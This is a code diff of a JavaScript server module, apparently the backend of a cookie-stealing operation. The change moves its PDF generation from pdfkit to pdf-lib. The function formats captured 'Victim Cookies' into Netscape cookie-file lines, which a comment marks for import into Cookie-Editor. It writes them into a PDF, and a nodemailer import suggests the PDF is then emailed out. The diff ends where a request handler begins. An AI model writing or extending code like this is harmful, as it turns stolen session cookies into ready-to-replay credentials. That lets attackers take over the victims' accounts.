@@ -1,40 +1,47 @@
 import nodemailer from 'nodemailer';
-import PDFDocument from 'pdfkit';
+import { PDFDocument, StandardFonts, rgb } from 'pdf-lib';
 
-function generateCookiePDF(cookies, email, domain) {
-  return new Promise((resolve) => {
-    const doc = new PDFDocument();
-    const chunks = [];
+async function generateCookiePDF(cookies, email, domain) {
+  const pdfDoc = await PDFDocument.create();
+  const page = pdfDoc.addPage([612, 792]);
+  const font = await pdfDoc.embedFont(StandardFonts.Helvetica);
+  const { height } = page.getSize();
 
-    doc.on('data', (chunk) => chunks.push(chunk));
-    doc.on('end', () => resolve(Buffer.concat(chunks)));
+  let y = height - 50;
 
-    doc.fontSize(16).text(`Victim Cookies: ${email}`, 50, 50);
-    doc.moveDown();
+  page.drawText(`Victim Cookies: ${email}`, { x: 50, y, size: 16, font, color: rgb(0, 0, 0) });
+  y -= 30;
 
-    doc.fontSize(12).text('# Netscape HTTP Cookie File', 50, 100);
-    doc.text('# Import into Cookie-Editor or browser (EditThisCookie)', 50, 120);
+  page.drawText('# Netscape HTTP Cookie File', { x: 50, y, size: 12, font, color: rgb(0, 0, 0) });
+  y -= 20;
 
-    const dom = domain || 'localhost';
-    const expires = Math.floor(Date.now() / 1000) + 86400; // +1 day
+  page.drawText('# Import into Cookie-Editor or browser', { x: 50, y, size: 10, font, color: rgb(0.4, 0.4, 0.4) });
+  y -= 30;
 
-    if (cookies && cookies !== 'none') {
-      const lines = cookies.split(';').map((c) => {
-        const eq = c.trim().indexOf('=');
-        if (eq < 0) return null;
-        const name = c.trim().substring(0, eq).trim();
-        const value = c.trim().substring(eq + 1).trim();
-        if (!name) return null;
-        // Netscape: domain  inclusion  path  secure  expiration  name  value
-        return `${dom}\tTRUE\t/\t0\t${expires}\t${name}\t${value}`;
-      }).filter(Boolean);
-      doc.text(lines.join('\n'), 50, 160);
-    } else {
-      doc.text('No cookies captured', 50, 160);
+  const dom = domain || 'localhost';
+  const expires = Math.floor(Date.now() / 1000) + 86400;
+
+  if (cookies && cookies !== 'none') {
+    const lines = cookies.split(';').map((c) => {
+      const eq = c.trim().indexOf('=');
+      if (eq < 0) return null;
+      const name = c.trim().substring(0, eq).trim();
+      const value = c.trim().substring(eq + 1).trim();
+      if (!name) return null;
+      return `${dom}\tTRUE\t/\t0\t${expires}\t${name}\t${value}`;
+    }).filter(Boolean);
+
+    const lineHeight = 12;
+    for (const line of lines) {
+      if (y < 50) break; // avoid overflow
+      page.drawText(line, { x: 50, y, size: 10, font, color: rgb(0, 0, 0) });
+      y -= lineHeight;
     }
+  } else {
+    page.drawText('No cookies captured', { x: 50, y, size: 12, font, color: rgb(0.5, 0, 0) });
+  }
 
-    doc.end();
-  });
+  return Buffer.from(await pdfDoc.save());
 }
 
 export default async function handler(req, res) {
